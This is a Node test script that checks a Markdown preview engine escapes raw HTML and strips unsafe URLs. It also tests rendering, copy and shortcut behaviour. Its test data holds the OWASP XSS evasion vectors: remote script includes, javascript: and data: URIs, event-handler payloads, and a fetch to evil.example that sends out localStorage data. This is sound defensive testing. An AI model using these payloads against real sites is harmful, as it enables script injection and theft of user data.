// Markdown Preview — CommonMark + GFM rendering, raw HTML escaped, unsafe URLs dropped
//
// Read:  src/components/tools/MarkdownPreviewTool.astro (extracts the real engine block
//        between the `engine:start` / `engine:end` markers, so this test cannot drift
//        from the shipped source); src/content/tools/markdown-preview/{en,zh,ja,ko}.mdx
//        (the example input and the HTML the pages say it produces)
// Write: stdout only (test results)
// Exit:  0 if all PASS, 1 if any FAIL
//
// The engine gets micromark and the GFM extension from node_modules, as the component does
// through its imports. Every output is parsed with parse5 (the HTML parser Astro already
// depends on) and checked structurally: only elements that Markdown itself produces, no
// on* attributes, no style attribute, and every href / src is http(s), mailto, relative or a
// fragment. The attack inputs are the vectors from the OWASP XSS Filter Evasion Cheat Sheet
// (raw tags, event handlers, javascript: with entities / tabs / case / whitespace, data:,
// vbscript:, SVG and MathML script, iframe / object / embed / style / meta / base) written both
// as raw HTML and inside Markdown link and image syntax.
//
// Run: node scripts/test-markdown-preview.mjs

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import vm from 'node:vm';
import { createHash } from 'node:crypto';
import { createRequire } from 'node:module';
import { loadPage, frontmatterStrings } from './astro-page-harness.mjs';
import { micromark } from 'micromark';
import { gfm, gfmHtml } from 'micromark-extension-gfm';
import { parseFragment } from 'parse5';
// Timing limits catch order-of-magnitude regressions; CI runners are several times slower than a dev machine.
const PERF_SLACK = process.env.CI ? 4 : 1;

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const componentPath = join(root, 'src/components/tools/MarkdownPreviewTool.astro');
const source = readFileSync(componentPath, 'utf8');
const requireRoot = createRequire(join(root, 'package.json'));
const STRINGS = frontmatterStrings(source.match(/^---\n([\s\S]*?)\n---/)[1]);
const clientStrings = lang => vm.runInNewContext(source.match(/const \{ tips: TIPS, \.\.\.CLIENT_T \} = T;/)[0] + '\nCLIENT_T', { T: STRINGS[lang] });
const escapeHtml = text => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
// Resolve the component's build-time labels and tip slots into the same DOM shell.
// The Astro compiler is checked below; this VM controls DOM APIs, not browser layout.
function pageMarkup(lang) {
  const T = STRINGS[lang];
  return source.slice(source.indexOf('\n---', 4) + 4, source.indexOf('<script'))
    .replace(/data-strings=\{JSON\.stringify\(CLIENT_T\)\}/, 'data-strings="' + escapeHtml(JSON.stringify(clientStrings(lang))) + '"')
    .replace(/<Toggletip id="([^"]+)" lang=\{lang\} about=\{T\.(\w+)\}>\{TIPS\.(\w+)\}<\/Toggletip>/g, (_, id, about, key) => '<span class="zt-tip"><button id="' + id + '-trigger" data-zt-tip="' + id + '">' + escapeHtml(T[about]) + '</button><span id="' + id + '">' + escapeHtml(T.tips[key]) + '</span></span>')
    .replace(/\{T\.(\w+)\}/g, (_, key) => escapeHtml(T[key]));
}

const START_MARK = '/* ── engine:start ── */';
const END_MARK = '/* ── engine:end ── */';
const startIndex = source.indexOf(START_MARK);
const endIndex = source.indexOf(END_MARK);
if (startIndex < 0 || endIndex <= startIndex) {
  console.error('FAIL: could not locate the engine block in MarkdownPreviewTool.astro');
  process.exit(1);
}
const block = source.slice(startIndex, endIndex);
const E = new Function(block + '\nreturn { renderMarkdown };')();
const lib = { micromark, gfm, gfmHtml };
const render = (md) => E.renderMarkdown(md, lib);

let failures = 0;
let passes = 0;
function check(name, ok, detail) {
  if (ok) { passes++; return; }
  failures++;
  console.log('FAIL: ' + name + (detail !== undefined ? ' — ' + detail : ''));
}
function eq(name, actual, expected) {
  check(name, actual === expected, 'got ' + JSON.stringify(actual) + ', expected ' + JSON.stringify(expected));
}
function has(name, html, fragment) {
  check(name, html.includes(fragment), 'missing ' + JSON.stringify(fragment) + ' in ' + JSON.stringify(html));
}

// Elements that CommonMark + GFM can produce. Anything else in the output came from raw HTML.
const MARKDOWN_TAGS = new Set([
  'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'em', 'strong', 'del', 'code', 'pre', 'a', 'img',
  'ul', 'ol', 'li', 'blockquote', 'hr', 'br', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'input', 'section', 'sup',
]);
const SAFE_URL = /^(https?:|mailto:|#|\/|\.|[^:]*$)/i;

function walk(node, visit) {
  visit(node);
  for (const child of node.childNodes || []) walk(child, visit);
  if (node.content) walk(node.content, visit);
}
function unsafeParts(html) {
  const problems = [];
  walk(parseFragment(html), (node) => {
    if (!node.tagName) return;
    if (!MARKDOWN_TAGS.has(node.tagName)) problems.push('<' + node.tagName + '>');
    for (const attr of node.attrs || []) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) problems.push(name + '=');
      if (name === 'style' || name === 'srcdoc' || name === 'formaction') problems.push(name + '=');
      if (name === 'href' || name === 'src') {
        // Browsers ignore ASCII tab / newline and leading control characters and spaces in URLs.
        const url = attr.value.replace(/[\t\n\r]/g, '').replace(/^[\u0000-\u0020]+/, '');
        if (url && !SAFE_URL.test(url)) problems.push(name + '=' + JSON.stringify(attr.value));
      }
    }
    if (node.tagName === 'input') {
      const type = (node.attrs.find((a) => a.name === 'type') || {}).value;
      const disabled = node.attrs.some((a) => a.name === 'disabled');
      if (type !== 'checkbox' || !disabled) problems.push('<input> that is not a disabled checkbox');
    }
  });
  return problems;
}
function safe(name, md) {
  const html = render(md);
  const problems = unsafeParts(html);
  check('safe: ' + name, problems.length === 0, problems.join(', ') + ' in ' + JSON.stringify(html));
  return html;
}

// ---------- the reported defect: raw HTML ran in the page ----------
{
  const html = safe('img onerror in a paragraph', 'Hello <img src=x onerror=alert(1)> world');
  has('raw <img> is shown as text', html, '&lt;img src=x onerror=alert(1)&gt;');
}
safe('raw HTML block', '<div>\n<img src=x onerror="fetch(\'//evil.example/?\'+localStorage.length)">\n</div>');

// OWASP XSS Filter Evasion Cheat Sheet vectors, as raw HTML (block and inline).
const OWASP = [
  '<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>',
  '<script>alert(1)</script>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=javascript:alert(\'XSS\')>',
  '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  '<a onmouseover="alert(document.cookie)">xxs link</a>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
  '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  '<IMG SRC="jav\tascript:alert(\'XSS\');">',
  '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
  '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
  '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
  '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
  '<<SCRIPT>alert("XSS");//\\<</SCRIPT>',
  '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
  '<iframe src=http://xss.rocks/scriptlet.html <',
  '<svg/onload=alert(\'XSS\')>',
  '<svg><script>alert(1)</script></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
  '<IMG DYNSRC="javascript:alert(\'XSS\')">',
  '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
  '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
  '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
  '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
  '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
  '<DIV STYLE="width: expression(alert(\'XSS\'));">',
  '<BASE HREF="javascript:alert(\'XSS\');//">',
  '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
  '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  '<a href="javascript:alert(1)">x</a>',
  '<form><button formaction=javascript:alert(1)>x</button></form>',
  '<details open ontoggle=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<!--><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
];
OWASP.forEach((v, i) => {
  safe('OWASP vector ' + (i + 1) + ' as a block', v);
  safe('OWASP vector ' + (i + 1) + ' inline', 'text ' + v + ' text');
  safe('OWASP vector ' + (i + 1) + ' in a list item', '- ' + v);
  safe('OWASP vector ' + (i + 1) + ' in a table cell', '| a |\n|---|\n| ' + v.replace(/\|/g, '\\|') + ' |');
});

// Dangerous URLs written with Markdown syntax instead of raw HTML.
const BAD_URLS = [
  'javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'javascript&#58;alert(1)', 'javascript&colon;alert(1)',
  '&#106;avascript:alert(1)', 'java%0ascript:alert(1)', 'vbscript:msgbox(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data:image/svg+xml,<svg onload=alert(1)>',
  'file:///etc/passwd', ' javascript:alert(1)',
];
for (const url of BAD_URLS) {
  safe('inline link ' + url, '[click](' + url.replace(/ /g, '%20') + ')');
  safe('angle-bracket link ' + url, '[click](<' + url + '>)');
  safe('image ' + url, '![x](' + url.replace(/ /g, '%20') + ')');
  safe('reference link ' + url, '[click][r]\n\n[r]: <' + url + '>');
  safe('autolink ' + url, '<' + url + '>');
}
safe('link title cannot break out of the attribute', '[x](https://a.example "t\\" onmouseover=\\"alert(1))');
safe('image alt cannot break out of the attribute', '![a" onerror="alert(1)](https://a.example/x.png)');
safe('code fence info string cannot inject attributes', '```js" onclick="alert(1)\nx\n```');
safe('footnote label', 'a[^<img src=x onerror=alert(1)>]\n\n[^<img src=x onerror=alert(1)>]: b');

{
  const html = render('[x](javascript:alert(1))');
  eq('javascript: link keeps its text and gets an empty href', html, '<p><a href="">x</a></p>');
  eq('https link is kept', render('[x](https://example.com/a?b=1&c=2)'), '<p><a href="https://example.com/a?b=1&amp;c=2">x</a></p>');
  eq('relative link is kept', render('[x](./docs/a.md#b)'), '<p><a href="./docs/a.md#b">x</a></p>');
  eq('mailto link is kept', render('<mailto:a@example.com>'), '<p><a href="mailto:a@example.com">mailto:a@example.com</a></p>');
  eq('https image is kept (it loads from the network)', render('![logo](https://example.com/logo.png)'), '<p><img src="https://example.com/logo.png" alt="logo" /></p>');
  eq('data: image is dropped', render('![d](data:image/png;base64,iVBORw0KGgo=)'), '<p><img src="" alt="d" /></p>');
}

// ---------- the other parser defects listed by the batch-04 audit ----------
eq('** inside a code span stays literal', render('`a **b** c`'), '<p><code>a **b** c</code></p>');
eq('** inside a fenced block stays literal', render('```\na **b**\n```'), '<pre><code>a **b**\n</code></pre>');
eq('nested list', render('- Parent\n  - Child'), '<ul>\n<li>Parent\n<ul>\n<li>Child</li>\n</ul>\n</li>\n</ul>');
has('capital [X] is a checked task', render('- [X] Done'), '<input type="checkbox" disabled="" checked="" /> Done');
eq('ordered list keeps its start number', render('3. third\n4. fourth'), '<ol start="3">\n<li>third</li>\n<li>fourth</li>\n</ol>');
{
  const html = render('| Item | Price |\n|:-----|------:|\n| Widget | $9.99 |\n| a \\| b | 1 |');
  has('left alignment', html, '<th align="left">Item</th>');
  has('right alignment', html, '<th align="right">Price</th>');
  has('escaped pipe stays in one cell', html, '<td align="left">a | b</td>');
}
has('bare URL becomes a link (GFM autolink literal)', render('See https://example.com.'), '<a href="https://example.com">https://example.com</a>.');
has('www autolink', render('www.example.com'), '<a href="http://www.example.com">www.example.com</a>');
has('reference-style link', render('[a][b]\n\n[b]: https://example.com'), '<a href="https://example.com">a</a>');
has('footnote', render('Text[^1]\n\n[^1]: Note'), 'Note');
has('strikethrough', render('~~gone~~'), '<del>gone</del>');
has('fenced code language class', render('```js\nx\n```'), '<code class="language-js">');
has('hard line break', render('a  \nb'), 'a<br />\nb');
has('setext heading', render('Title\n=====\n'), '<h1>Title</h1>');
has('lazy blockquote continuation', render('> a\nb'), '<blockquote>\n<p>a\nb</p>\n</blockquote>');
eq('empty input', render(''), '');
has('entities pass through as text', render('AT&T &copy; &lt;b&gt;'), 'AT&amp;T © &lt;b&gt;');

// ---------- the example on the tool pages ----------
for (const lang of ['en', 'zh', 'ja', 'ko']) {
  const mdx = readFileSync(join(root, 'src/content/tools/markdown-preview/' + lang + '.mdx'), 'utf8');
  const input = mdx.match(/````markdown\n([\s\S]*?)\n````/);
  const output = mdx.match(/```html\n([\s\S]*?)\n```/);
  check(lang + ': page has the example input and output', !!(input && output));
  if (input && output) eq(lang + ': example output is what the engine produces', render(input[1]), output[1]);
}

// ---------- the component wires the engine and keeps the copy safe ----------
check('component imports micromark and the GFM extension',
  /from 'micromark'/.test(source) && /from 'micromark-extension-gfm'/.test(source));
check('component no longer has the hand-written parser', !/function parseMarkdown/.test(source));
check('engine does not allow dangerous HTML or protocols',
  !/allowDangerousHtml:\s*true/.test(block) && !/allowDangerousProtocol:\s*true/.test(block));

// ---------- size and speed ----------
{
  const big = Array.from({ length: 2000 }, (_, i) => '## H' + i + '\n\nText **b** `c` [l](https://e.example/' + i + ')\n\n- a\n  - b\n').join('\n');
  const t0 = performance.now();
  render(big);
  const ms = performance.now() - t0;
  check('2,000 sections render in under 1.5 s', ms < 1500 * PERF_SLACK, ms.toFixed(0) + ' ms');
}

// ---------- actual page lifecycle + actual ToolLayout keyboard listener ----------
// The real module, micromark/GFM and highlight.js run unchanged. Only DOM, clock and
// clipboard completion are controlled; the DOM tree comes from the shipped markup.
const layoutSource = readFileSync(join(root, 'src/layouts/ToolLayout.astro'), 'utf8');
const shortcutStart = layoutSource.indexOf("      document.addEventListener('keydown'", layoutSource.indexOf('// ── Keyboard shortcuts'));
const shortcutEnd = layoutSource.indexOf('      // ── Copy button visual feedback', shortcutStart);
const sharedShortcut = layoutSource.slice(shortcutStart, shortcutEnd);
check('actual shared shortcut found', shortcutStart >= 0 && sharedShortcut.includes('window.ztPersist.clear(_slug)'));
function page({ lang = 'en', order = 'before', preset = '' } = {}) {
  const docHandlers = {}, requests = [], tracks = [], clears = [];
  let document, clock = 0, sequence = 0;
  const timers = new Map();
  function text(n) { return n.tagName ? n.childNodes.map(text).join('') : n.value || ''; }
  function wrap(n, parentNode = null) {
    if (!n.tagName) return { value: n.value || '', parentNode };
    const attributes = Object.fromEntries((n.attrs || []).map(a => [a.name, a.value]));
    const handlers = {};
    const el = { tagName: n.tagName.toUpperCase(), attributes, parentNode, childNodes: [], dataset: Object.fromEntries(Object.entries(attributes).filter(([key]) => key.startsWith('data-')).map(([key, value]) => [key.slice(5), value])), value: attributes.value || '', disabled: 'disabled' in attributes,
      get id() { return this.attributes.id || ''; },
      get className() { return this.attributes.class || ''; }, set className(v) { this.attributes.class = String(v); },
      get children() { return this.childNodes.filter(n => n.tagName); },
      get textContent() { return text(this); }, set textContent(v) { this.childNodes = [{ value: String(v), parentNode: this }]; },
      get innerHTML() { return this._html || ''; }, set innerHTML(v) { this._html = String(v); this.childNodes = parseFragment(this._html).childNodes.map(n => wrap(n, this)); },
      getAttribute(k) { return Object.hasOwn(this.attributes, k) ? this.attributes[k] : null; },
      setAttribute(k, v) { this.attributes[k] = String(v); if (k.startsWith('data-')) this.dataset[k.slice(5)] = String(v); },
      removeAttribute(k) { delete this.attributes[k]; if (k.startsWith('data-')) delete this.dataset[k.slice(5)]; },
      contains(other) { for (let n = other; n; n = n.parentNode) if (n === this) return true; return false; },
      querySelectorAll(selector) { return descendants(this).filter(n => matches(n, selector)); },
      addEventListener(type, fn) { (handlers[type] ||= []).push(fn); },
      focus() { document.activeElement = this; },
      dispatch(type, init = {}) {
        const e = { type, target: this, currentTarget: this, defaultPrevented: false, cancelBubble: false,
          preventDefault() { this.defaultPrevented = true; }, stopPropagation() { this.cancelBubble = true; }, ...init };
        for (const fn of handlers[type] || []) fn.call(this, e);
        if (!e.cancelBubble) for (const fn of docHandlers[type] || []) fn.call(document, e);
        return e;
      },
      click() { if (!this.disabled) this.dispatch('click'); },
    };
    el.classList = {
      add(...items) { el.className = [...new Set([...el.className.split(/\s+/).filter(Boolean), ...items])].join(' '); },
      remove(...items) { el.className = el.className.split(/\s+/).filter(x => !items.includes(x)).join(' '); },
      contains(item) { return el.className.split(/\s+/).includes(item); },
    };
    el.childNodes = (n.childNodes || []).map(child => wrap(child, el));
    if (el.tagName === 'TEXTAREA') el.value = el.textContent;
    return el;
  }
  function descendants(n) { return n.childNodes.flatMap(c => c.tagName ? [c, ...descendants(c)] : []); }
  function matches(n, selector) {
    if (selector === 'textarea, input[type="text"]') return n.tagName === 'TEXTAREA' || n.tagName === 'INPUT' && n.attributes.type === 'text';
    if (selector === 'pre code') return n.tagName === 'CODE' && n.parentNode?.tagName === 'PRE';
    if (selector === 'a[href]') return n.tagName === 'A' && Object.hasOwn(n.attributes, 'href');
    const attr = selector.match(/^\[([^\]]+)\]$/); if (attr) return Object.hasOwn(n.attributes, attr[1]);
    if (selector.startsWith('.')) return n.classList.contains(selector.slice(1));
    throw Error('unhandled page selector ' + selector);
  }
  const body = wrap({ tagName: 'body', attrs: [], childNodes: [] });
  const markup = pageMarkup(lang);
  const widget = wrap({ tagName: 'section', attrs: [{ name: 'class', value: 'tool-widget' }], childNodes: parseFragment(markup).childNodes }, body);
  body.childNodes.push(widget);
  document = { documentElement: { lang }, body, activeElement: body,
    getElementById(id) { const e = descendants(body).find(n => n.id === id); if (!e) throw Error('missing actual DOM #' + id); return e; },
    querySelectorAll(selector) { return descendants(body).filter(n => matches(n, selector)); },
    querySelector(selector) { return selector === '.tool-widget .btn-primary' ? descendants(widget).find(n => n.classList.contains('btn-primary')) || null : this.querySelectorAll(selector)[0] || null; },
    addEventListener(type, fn) { (docHandlers[type] ||= []).push(fn); },
    execCommand() { throw Error('OS clipboard prohibited in page test'); },
  };
  const $ = id => document.getElementById(id), editor = $('mp-editor');
  editor.value = preset;
  const globals = { document,
    navigator: { clipboard: { writeText(value) { return new Promise((resolve, reject) => requests.push({ value, resolve, reject })); }, write() { throw Error('unexpected clipboard.write'); } } },
    setTimeout(fn, delay) { const id = ++sequence; timers.set(id, { fn, due: clock + delay, delay }); return id; },
    clearTimeout(id) { timers.delete(id); },
    trackTool(...args) { tracks.push(args); }, ztPersist: { clear(slug) { clears.push(slug); } },
  };
  if (order === 'before') { const context = { ...globals, _slug: 'markdown-preview' }; context.window = context; vm.runInNewContext(sharedShortcut, context); }
  const loaded = loadPage(relative(root, componentPath), { lang, globals });
  if (order === 'after') loaded.run('var _slug="markdown-preview";\n' + sharedShortcut);
  return { $, editor, preview: $('mp-preview'), copy: $('mp-copy-html'), status: $('mp-status'), count: $('mp-word-count'), document, requests, tracks, clears, globals, loaded, timers,
    advance(ms) {
      const end = clock + ms; let guard = 0;
      while (true) {
        const next = [...timers].filter(([,t]) => t.due <= end).sort((a,b) => a[1].due - b[1].due)[0];
        if (!next) break; if (++guard > 100) throw Error('page timer runaway');
        clock = next[1].due; timers.delete(next[0]); next[1].fn();
      }
      clock = end;
    },
    type(value) { editor.focus(); editor.value = value; editor.dispatch('input'); },
    render(value) { this.type(value); this.advance(300); },
    clearKey(meta = false, focus = 'mp-editor') { $(focus).focus(); return $(focus).dispatch('keydown', { key: 'l', ctrlKey: !meta, metaKey: meta }); },
    snapshot() { return [editor.value, this.preview.innerHTML, this.count.textContent, this.copy.textContent, this.status.textContent]; },
  };
}
const pageLabels = {
  en: { copy: 'Copy HTML', copied: 'Copied!', failure: 'Copy failed', zero: '0 words · 0 chars' },
  zh: { copy: '复制 HTML', copied: '已复制！', failure: '复制失败', zero: '0 词 · 0 字符' },
  ja: { copy: 'HTML コピー', copied: 'コピー済み！', failure: 'コピー失敗', zero: '0 語 · 0 文字' },
  ko: { copy: 'HTML 복사', copied: '복사됨!', failure: '복사 실패', zero: '0 단어 · 0 문자' },
};
const settlePage = () => new Promise(resolve => setImmediate(resolve));
const unhandledCopies = [];
function recordUnhandled(error) { unhandledCopies.push(String(error?.message || error)); }
process.on('unhandledRejection', recordUnhandled);
for (const lang of ['en', 'zh', 'ja', 'ko']) {
  const early = page({ lang, preset: '# Typed early' });
  eq(lang + ' early input remains', early.editor.value, '# Typed early');
  eq(lang + ' early input renders immediately', early.preview.innerHTML, '<h1>Typed early</h1>');
  const p = page({ lang });
  check(lang + ' empty startup keeps default sample', p.editor.value.startsWith('# Welcome to Markdown Preview\n'));
  check(lang + ' real default sample renders', p.preview.innerHTML.startsWith('<h1>Welcome to Markdown Preview</h1>'));
  check(lang + ' real highlight.js ran on default sample', p.preview.querySelectorAll('pre code').some(e => e.classList.contains('hljs') && e.innerHTML.includes('hljs-keyword')));
  p.type('# Fresh'); p.advance(299);
  check(lang + ' input waits original 300 ms', p.preview.innerHTML.startsWith('<h1>Welcome'));
  p.advance(1); eq(lang + ' 300 ms emits actual Markdown', p.preview.innerHTML, '<h1>Fresh</h1>');
  p.type('# Cancelled'); p.$('mp-clear').click();
  eq(lang + ' Clear clears editor/result/count/status', JSON.stringify([p.editor.value,p.preview.innerHTML,p.count.textContent,p.status.textContent]), JSON.stringify(['','','','']));
  const cleared = p.snapshot(); p.advance(300);
  eq(lang + ' Clear cancels old count rewrite', JSON.stringify(p.snapshot()), JSON.stringify(cleared));
  p.copy.click(); eq(lang + ' cleared rendered HTML cannot be copied', p.requests.length, 0);
  p.type(''); p.advance(300); eq(lang + ' actual empty input still shows original zero count', p.count.textContent, pageLabels[lang].zero);
  for (const order of ['before', 'after']) {
    const q = page({ lang, order }); q.render('# Shortcut'); q.type('# Queued');
    q.status.textContent = 'old feedback'; const event = q.clearKey(order === 'after', 'mp-copy-html');
    check(lang + ' ' + order + ' CtrlL handled in tool', event.defaultPrevented);
    eq(lang + ' ' + order + ' CtrlL clears editor/result/count/status', JSON.stringify([q.editor.value,q.preview.innerHTML,q.count.textContent,q.status.textContent]), JSON.stringify(['','','','']));
    eq(lang + ' ' + order + ' CtrlL keeps focus on editor', q.document.activeElement?.id, 'mp-editor');
    eq(lang + ' ' + order + ' shared storage clear still runs', JSON.stringify(q.clears), JSON.stringify(['markdown-preview']));
    q.copy.click(); eq(lang + ' ' + order + ' CtrlL immediately invalidates copied HTML cache', q.requests.length, 0);
    if (q.requests[0]) { q.requests[0].resolve(); await settlePage(); }
    const empty = q.snapshot(); q.advance(300);
    eq(lang + ' ' + order + ' CtrlL cancels queued rewrite', JSON.stringify(q.snapshot()), JSON.stringify(empty));
    q.copy.click(); eq(lang + ' ' + order + ' CtrlL invalidates copied HTML cache', q.requests.length, 0);
  }
}
// Current feedback and retry use all locales; races assert the observed DOM and
// complete clipboard bytes, never private lastHtml/revision/timer variables.
for (const lang of ['en', 'zh', 'ja', 'ko']) {
  const labels = pageLabels[lang], p = page({ lang });
  const md = '**Copy** [site](https://example.com)\n\n```js\nconst n = 1;\n```';
  const html = '<p><strong>Copy</strong> <a href="https://example.com">site</a></p>\n<pre><code class="language-js">const n = 1;\n</code></pre>';
  p.render(md);
  eq(lang + ' preview link opens new tab', p.preview.querySelectorAll('a[href]')[0]?.getAttribute('target'), '_blank');
  eq(lang + ' preview link keeps opener/referrer protection', p.preview.querySelectorAll('a[href]')[0]?.getAttribute('rel'), 'noopener noreferrer');
  check(lang + ' real highlighter decorates preview code', p.preview.querySelectorAll('pre code')[0]?.innerHTML.includes('hljs-keyword'));
  p.copy.click(); eq(lang + ' Copy uses full raw renderer HTML', p.requests[0]?.value, html);
  p.requests[0].resolve(); await settlePage();
  eq(lang + ' current success label', p.copy.textContent, labels.copied);
  p.advance(1499); eq(lang + ' feedback lasts 1500 ms', p.copy.textContent, labels.copied);
  p.advance(1); eq(lang + ' current success restores Copy', p.copy.textContent, labels.copy);
  const before = unhandledCopies.length;
  p.copy.click(); p.requests[1].reject(Error('controlled current rejection')); await settlePage();
  eq(lang + ' current rejection is handled', unhandledCopies.length - before, 0);
  eq(lang + ' current rejection has localized feedback', p.status.textContent, labels.failure);
  p.copy.click(); eq(lang + ' same-result retry keeps full bytes', p.requests[2]?.value, html);
  p.requests[2].resolve(); await settlePage();
  eq(lang + ' same-result retry succeeds', p.copy.textContent, labels.copied);
  eq(lang + ' same-result retry removes old failure', p.status.textContent, '');
  eq(lang + ' copying never changes editor', p.editor.value, md);
  p.globals.navigator.clipboard = undefined;
  let thrown; try { p.copy.click(); } catch (e) { thrown = e.message; }
  eq(lang + ' absent clipboard API does not throw', thrown, undefined);
  eq(lang + ' absent clipboard API has localized feedback', p.status.textContent, labels.failure);
  p.$('mp-clear').click(); eq(lang + ' Clear removes copy feedback', p.status.textContent, '');
  for (const boundary of ['Clear', 'CtrlL', 'input', 'new-result']) {
    for (const finish of ['resolve', 'reject']) {
      const q = page({ lang }); q.render('**Old**'); q.copy.click();
      eq(lang + ' ' + boundary + '/' + finish + ' starts from actual HTML', q.requests[0]?.value, '<p><strong>Old</strong></p>');
      if (boundary === 'Clear') q.$('mp-clear').click();
      else if (boundary === 'CtrlL') q.clearKey(false, 'mp-copy-html');
      else if (boundary === 'input') q.type('**New**');
      else q.render('**New**');
      const snapshot = q.snapshot(), errors = unhandledCopies.length;
      q.requests[0][finish](finish === 'reject' ? Error('controlled stale rejection') : undefined); await settlePage();
      eq(lang + ' ' + boundary + '/' + finish + ' stale completion leaves current DOM', JSON.stringify(q.snapshot()), JSON.stringify(snapshot));
      eq(lang + ' ' + boundary + '/' + finish + ' stale rejection is handled', unhandledCopies.length - errors, 0);
    }
  }
  {
    const q = page({ lang }); q.render('**Same**');
    q.copy.click(); q.requests[0].resolve(); await settlePage(); q.advance(100);
    q.copy.click(); q.requests[1].resolve(); await settlePage(); q.advance(1400);
    eq(lang + ' older timer does not erase newer success', q.copy.textContent, labels.copied);
    q.advance(100); eq(lang + ' newer timer restores at its own deadline', q.copy.textContent, labels.copy);
  }
}
// Same HTML copied twice must still have separate completion ownership.
for (const completionOrder of ['old-first', 'new-first']) {
  for (const finish of ['resolve', 'reject']) {
    const p = page(); p.render('**Same**'); p.copy.click(); p.copy.click();
    eq(completionOrder + '/' + finish + ' both requests keep identical full HTML', JSON.stringify(p.requests.map(r => r.value)), JSON.stringify(['<p><strong>Same</strong></p>','<p><strong>Same</strong></p>']));
    const errors = unhandledCopies.length;
    if (completionOrder === 'new-first') { p.requests[1].resolve(); await settlePage(); }
    const snapshot = p.snapshot();
    p.requests[0][finish](finish === 'reject' ? Error('superseded same-output rejection') : undefined); await settlePage();
    eq(completionOrder + '/' + finish + ' superseded request cannot change feedback', JSON.stringify(p.snapshot()), JSON.stringify(snapshot));
    eq(completionOrder + '/' + finish + ' superseded rejection is handled', unhandledCopies.length - errors, 0);
    if (completionOrder === 'old-first') { p.requests[1].resolve(); await settlePage(); }
    eq(completionOrder + '/' + finish + ' current request alone owns success', p.copy.textContent, pageLabels.en.copied);
  }
}
{
  const p = page(); p.render('[jump](#here) ![image](https://example.com/image.png)');
  eq('fragment link does not gain new-tab attributes', p.preview.querySelectorAll('a[href]')[0]?.getAttribute('target'), null);
  p.copy.click(); eq('image network URL and fragment renderer bytes unchanged', p.requests[0]?.value, '<p><a href="#here">jump</a> <img src="https://example.com/image.png" alt="image" /></p>');
  p.requests[0].resolve(); await settlePage();
  p.document.activeElement = p.document.body; const before = p.snapshot();
  // Dispatch from an element outside the tool: the shared and local shortcuts both ignore it.
  p.document.body.dispatch('keydown', { key: 'l', ctrlKey: true });
  eq('CtrlL outside tool does not clear tool', JSON.stringify(p.snapshot()), JSON.stringify(before));
}
process.removeListener('unhandledRejection', recordUnhandled);

// ---------- v2 page layout ----------
const sha = text => createHash('sha256').update(text).digest('hex');
const markup = source.slice(source.indexOf('\n---', 4) + 4, source.indexOf('<script'));
const clientScript = source.match(/<script>([\s\S]*?)<\/script>/)[1];
const cssSource = source.match(/<style>([\s\S]*?)<\/style>/)[1];
const engineExact = source.match(/^    \/\* ── engine:start ── \*\/[\s\S]*?^    \/\* ── engine:end ── \*\//m)[0];
eq('v2 engine inclusive bytes unchanged', Buffer.byteLength(engineExact), 309);
